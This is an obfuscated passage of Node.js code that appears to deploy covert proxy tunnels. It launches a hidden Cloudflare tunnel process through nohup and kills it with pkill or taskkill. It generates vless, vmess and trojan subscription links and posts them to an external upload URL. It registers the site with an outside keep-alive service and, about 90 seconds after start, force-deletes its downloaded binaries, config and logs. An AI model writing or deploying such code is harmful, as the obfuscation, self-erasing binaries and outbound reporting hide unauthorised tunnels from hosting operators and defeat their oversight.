_0x115e09;if(ARGO_AUTH&&ARGO_DOMAIN)_0x115e09=ARGO_DOMAIN,console['log'](_0xf8af8a(0x10d)+'N:',_0x115e09),await generateLinks(_0x115e09);else try{const _0x10df11=fs[_0xf8af8a(0x145)+'nc'](bootLogPath,_0xf8af8a(0x171)),_0x5033d4=_0x10df11['split']('\x0a'),_0x546b59=[];_0x5033d4['forEach'](_0x2bf09a=>{const _0x13720e=_0xf8af8a,_0x4509d5=_0x2bf09a[_0x13720e(0x166)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4509d5){const _0x50d04f=_0x4509d5[0x1];_0x546b59['push'](_0x50d04f);}});if(_0x546b59[_0xf8af8a(0x101)]>0x0)_0x115e09=_0x546b59[0x0],console['log'](_0xf8af8a(0x107)+':',_0x115e09),await generateLinks(_0x115e09);else{console['log']('ArgoDomain'+'\x20not\x20found'+_0xf8af8a(0x144)+'ng\x20bot\x20to\x20'+'obtain\x20Arg'+_0xf8af8a(0x178)),fs['unlinkSync'](bootLogPath);async function _0x2e4971(){const _0x53e272=_0xf8af8a;try{process[_0x53e272(0x18c)]==='win32'?await exec('taskkill\x20/'+'f\x20/im\x20'+botName+('.exe\x20>\x20nul'+'\x202>&1')):await exec('pkill\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+(_0x53e272(0x146)+'ull\x202>&1'));}catch(_0x7b0855){}}_0x2e4971(),await new Promise(_0x4df3ff=>setTimeout(_0x4df3ff,0xbb8));const _0x3ac6fa='tunnel\x20--e'+_0xf8af8a(0x155)+_0xf8af8a(0x15f)+'--no-autou'+'pdate\x20--pr'+_0xf8af8a(0xc7)+_0xf8af8a(0x13e)+_0xf8af8a(0x116)+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+'rl\x20http://'+_0xf8af8a(0x16a))+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3ac6fa+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+(_0xf8af8a(0x17f)+'g')),await new Promise(_0x5edf3b=>setTimeout(_0x5edf3b,0xbb8)),await extractDomains();}catch(_0x21b4cd){console['error']('Error\x20exec'+_0xf8af8a(0x141)+'and:\x20'+_0x21b4cd);}}}catch(_0x26c90d){console['error'](_0xf8af8a(0x149)+'ing\x20boot.l'+'og:',_0x26c90d);}}async function generateLinks(_0x8eca8d){const _0x136be7=_0x2fa26a,_0x3a0fb3=await getMetaInfo(),_0x147db4=NAME?NAME+'-'+_0x3a0fb3:_0x3a0fb3,_0x112d64={'v':'2','ps':_0x147db4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x8eca8d,'path':'/vmess-arg'+_0x136be7(0xb7),'tls':'tls','sni':_0x8eca8d,'fp':'firefox'},_0x2232d9=Buffer[_0x136be7(0x189)](JSON[_0x136be7(0x16d)](_0x112d64))[_0x136be7(0x1a3)]('base64'),_0x2066a8='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+(_0x136be7(0x160)+_0x136be7(0x18e)+'urity=tls&'+_0x136be7(0x1b1))+_0x8eca8d+(_0x136be7(0x111)+'x&type=ws&'+'host=')+_0x8eca8d+('&path=%2Fv'+_0x136be7(0xbb)+'3Fed%3D256'+'0#')+_0x147db4+_0x136be7(0x10a)+_0x2232d9+('\x0a\x0atrojan:/'+'/')+UUID+'@'+CFIP+':'+CFPORT+('?security='+'tls&sni=')+_0x8eca8d+('&fp=firefo'+_0x136be7(0xfa)+_0x136be7(0x127))+_0x8eca8d+('&path=%2Ft'+'rojan-argo'+_0x136be7(0x138)+'60#')+_0x147db4+'\x0a\x20\x20\x20\x20';return console[_0x136be7(0x16c)](Buffer['from'](_0x2066a8)['toString']('base64')),fs[_0x136be7(0x123)+_0x136be7(0xde)](subPath,Buffer['from'](_0x2066a8)[_0x136be7(0x1a3)]('base64')),console[_0x136be7(0x16c)](subPath+('\x20saved\x20suc'+_0x136be7(0x156))),uploadNodes(),app['get']('/'+SUB_PATH,(_0xa3670,_0x1a06a0)=>{const _0x537e25=_0x136be7,_0x6ef491=Buffer['from'](_0x2066a8)[_0x537e25(0x1a3)]('base64');_0x1a06a0[_0x537e25(0x150)]('Content-Ty'+'pe',_0x537e25(0x188)+';\x20charset='+'utf-8'),_0x1a06a0['send'](_0x6ef491);}),_0x2066a8;}async function uploadNodes(){const _0x18d9fb=_0x2fa26a;if(UPLOAD_URL&&PROJECT_URL){const _0x369567=PROJECT_URL+'/'+SUB_PATH,_0x4146bd={'subscription':[_0x369567]};try{const _0x240962=await axios['post'](UPLOAD_URL+('/api/add-s'+_0x18d9fb(0xbd)+'ns'),_0x4146bd,{'headers':{'Content-Type':'applicatio'+'n/json'}});return _0x240962&&_0x240962[_0x18d9fb(0x1a2)]===0xc8?(console['log']('Subscripti'+'on\x20uploade'+_0x18d9fb(0xb4)+_0x18d9fb(0xec)),_0x240962):null;}catch(_0x35086b){if(_0x35086b['response']){if(_0x35086b[_0x18d9fb(0x1a9)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5a7c68=fs['readFileSy'+'nc'](listPath,'utf-8'),_0x2dd58d=_0x5a7c68[_0x18d9fb(0xba)]('\x0a')['filter'](_0x4495c1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4495c1));if(_0x2dd58d[_0x18d9fb(0x101)]===0x0)return;const _0x2f1313=JSON[_0x18d9fb(0x16d)]({'nodes':_0x2dd58d});try{const _0x28220c=await axios['post'](UPLOAD_URL+(_0x18d9fb(0x165)+_0x18d9fb(0xcd)),_0x2f1313,{'headers':{'Content-Type':'applicatio'+_0x18d9fb(0x1a1)}});return _0x28220c&&_0x28220c[_0x18d9fb(0x1a2)]===0xc8?(console['log']('Nodes\x20uplo'+_0x18d9fb(0xe8)+_0x18d9fb(0x179)),_0x28220c):null;}catch(_0xd6c215){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4c2ace=_0x54fc,_0x129b36=[bootLogPath,configPath,webPath,botPath,monitorPath];if(NEZHA_PORT)_0x129b36['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x129b36['push'](phpPath);process['platform']===_0x4c2ace(0x182)?exec('del\x20/f\x20/q\x20'+_0x129b36[_0x4c2ace(0xfd)](_0x186301=>fs[_0x4c2ace(0x162)](_0x186301))['join']('\x20')+(_0x4c2ace(0x152)+'1'),_0x4eb9a9=>{const _0x51bd65=_0x4c2ace;console[_0x51bd65(0x1b3)](),console[_0x51bd65(0x16c)]('App\x20is\x20run'+_0x51bd65(0x124)),console['log']('Thank\x20you\x20'+_0x51bd65(0x12e)+_0x51bd65(0x14c)+_0x51bd65(0x125));}):exec(_0x4c2ace(0x122)+_0x129b36[_0x4c2ace(0xfd)](_0x3bdc9b=>fs[_0x4c2ace(0x162)](_0x3bdc9b))[_0x4c2ace(0x19b)]('\x20')+(_0x4c2ace(0xb3)+_0x4c2ace(0x170)),_0x192977=>{const _0x3be4ba=_0x4c2ace;console[_0x3be4ba(0x1b3)](),console['log'](_0x3be4ba(0x1ae)+_0x3be4ba(0x124)),console[_0x3be4ba(0x16c)](_0x3be4ba(0x18a)+_0x3be4ba(0x12e)+_0x3be4ba(0x14c)+'t,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x28d8ab=_0x2fa26a;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20a'+'dding\x20auto'+_0x28d8ab(0x159)+_0x28d8ab(0xd8));return;}try{const _0x20c5b3=await axios['post']('https://oo'+'oo.serv00.'+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':'applicatio'+_0x28d8ab(0x1a1)}});return console['log']('automatic\x20'+_0x28d8ab(0xe9)+'k\x20added\x20su'+_0x28d8ab(0x133)),_0x20c5b3;}catch(_0x3c0983){return console['error']('Add\x20automa'+_0x28d8ab(0x14d)+_0x28d8ab(0xc6)+_0x28d8ab(0x199)+_0x3c0983['message']),null;}}async function startserver(){const _0xada678=_0x2fa26a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await downloadAndRunMonitorScript(),await AddVisitTask();}catch(_0x162254){console['error'](_0xada678(0xc2)+_0xada678(0xaf)+':',_0x162254);}}startserver()['catch'](_0x468406=>{const _0x76c468=_0x2fa26a;console['error']('Unhandled\x20'+_0x76c468(0x11a)+_0x76c468(0xaf)+':',_0x468406);}),app[_0x2fa26a(0x143)](PORT,()=>console['log']('http\x20serve'+'r\x20is\x20runni'+_0x2fa26a(0x113)+':'+PORT+'!')),process['on'](_0x2fa26a(0xcb),()=>{const _0x318e66=_0x2fa26a;console[_0x318e66(0x16c)](_0x318e66(0x142)+'理...'),console['log']('程序退出'),process[_0x318e66(0x103)](0x0);}),process['on'](_0x2fa26a(0x175),()=>{const _0x2e914c=_0x2fa26a;console['log'](_0x2e914c(0x114)+_0x2e914c(0xb8)),console[_0x2e914c(0x16c)]('程序退出'),process['exit'](0x0);});
